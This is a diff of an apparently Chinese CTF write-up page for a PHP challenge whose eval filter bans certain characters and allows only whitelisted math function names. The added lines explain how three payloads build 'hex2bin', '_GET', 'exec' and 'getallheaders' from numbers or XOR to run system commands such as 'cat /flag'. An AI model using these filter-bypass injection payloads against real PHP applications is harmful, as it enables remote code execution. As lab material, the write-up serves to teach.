@@ -89,9 +89,24 @@ if(!isset($_GET[&#39;c&#39;])){
 <li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 这些字符</li>
 <li>payload中不能有不是$whitelist白名单里面的单词出现</li>
 </ol>
+<p><strong>base_convert() 函数：在任意进制之间转换数字</strong></p>
+<p><strong>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符</strong></p>
+<p><strong>dechex() 函数把十进制转换为十六进制</strong></p>
 <pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag</code></pre>
+<ul>
+<li>base_convert(37907361743,10,36) =&gt; “hex2bin”</li>
+<li>dechex(1598506324) =&gt; “5f474554”</li>
+<li>$pi=hex2bin(“5f474554”) =&gt; $pi=”_GET”   //hex2bin将一串16进制数转换为二进制字符串</li>
+<li>($$pi){pi}(($$pi){abs}) =&gt; ($GET){pi}($_GET){abs}  //{}可以代替[]</li>
+</ul>
 <pre><code>?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))(){1})//exec(getallheaders(){1})</code></pre>
-<pre><code>http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre>
+<ul>
+<li>base_convert(696468,10,36) =&gt; “exec”</li>
+<li>$pi(8768397090111664438,10,30) =&gt; “getallheaders”</li>
+<li>exec(getallheaders(){1})</li>
+<li>//操作xx和yy，中间用逗号隔开，echo都能输出echo xx,yy</li>
+</ul>
+<pre><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
